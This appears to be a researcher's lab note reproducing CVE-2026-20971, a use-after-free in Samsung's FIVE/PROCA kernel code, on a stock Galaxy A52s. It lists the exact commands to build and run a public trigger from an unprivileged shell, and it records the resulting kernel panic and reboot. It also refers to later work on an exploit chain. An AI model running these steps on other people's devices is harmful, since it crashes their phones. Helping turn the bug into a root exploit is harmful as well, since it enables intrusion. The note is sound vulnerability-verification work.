# A52 FIVE/PROCA UAF DoS — 2026-11-21

- **Device:** Samsung Galaxy A52s 5G `SM-A528B`, kernel
  `5.4.254-qgki-28575149-abA528BXXSBGYI3`, SPL `2025-09-01`, binary B
- **Probe:** CVE-2026-20971 public reproduction harness
  [zhanghangjie/CVE-2026-20971-CYL1](https://github.com/zhanghangjie/CVE-2026-20971-CYL1),
  `src/five_uaf_probe.c`, rebuilt for arm64 API 34 with NDK 30
- **Binary SHA-256:** `a3f7a0acf11cb28238476924bfc1e6a426ec0b25491b8d6f423053d795e36473`
  (see the header of `a52-five-uaf-dos.log` for the captured value)
- **Run as:** `uid=2000(shell)`, SELinux `Enforcing`; no root and no payload
  installed

## Commands

```sh
NDK=$PWD/.android-sdk/ndk/30.0.16248370
$NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android34-clang \
  -O2 -pthread -o /tmp/five_uaf_probe /tmp/five_uaf_probe.c
adb push /tmp/five_uaf_probe /data/local/tmp/five_uaf_probe
adb shell 'chmod 755 /data/local/tmp/five_uaf_probe'
adb shell 'cat /proc/sys/kernel/random/boot_id'
adb shell 'cd /data/local/tmp && ./five_uaf_probe 3 reset_file'
```

## Observed

```text
boot_before = 67f3ea44-b491-4b32-956c-8c7306157040
# trigger runs; host adb shell times out because the device panics
boot_after  = 27d1bcba-dea6-45b0-9cd6-1679851bbb67
ro.boot.bootreason = kernel_panic,null
sys.boot.reason    = kernel_panic,null
```

- `/proc/self/integrity/{reset_file,label,value,reset_cause}` exists and is
  readable by shell.
- `panic_on_oops` and `/sys/fs/pstore` are root-only; the stock default is
  `panic_on_oops=1`.
- The public trigger's reader races the victim's `execve()` against
  `/proc/<pid>/integrity/reset_file`; on this stock A52 it produced a kernel
  panic and reboot. The phone recovered to a clean boot; the app data survived.
- No `uid=0` was obtained. This is a **DoS/UAF confirmation**, not a root
  primitive. `dmesg`, `last_kmsg`, and pstore are not readable as shell, so the
  oops text is not in the note.

Full captured output and boot evidence: [a52-five-uaf-dos.log](a52-five-uaf-dos.log).

## Verdict

**A52-verified: the CVE-2026-20971 PROCA/FIVE `task_integrity` UAF path is
present and reachable from an unprivileged shell; the public harness turns it
into a kernel panic/reboot.**

Not verified: any reclaim, arbitrary read/write, control-flow hijack, or root.
Turning this into a chain needs `panic_on_oops=0`/KASAN and a lab kernel, which
the locked stock A52 cannot run. See [research/a52-chain](../../research/a52-chain/README.md).
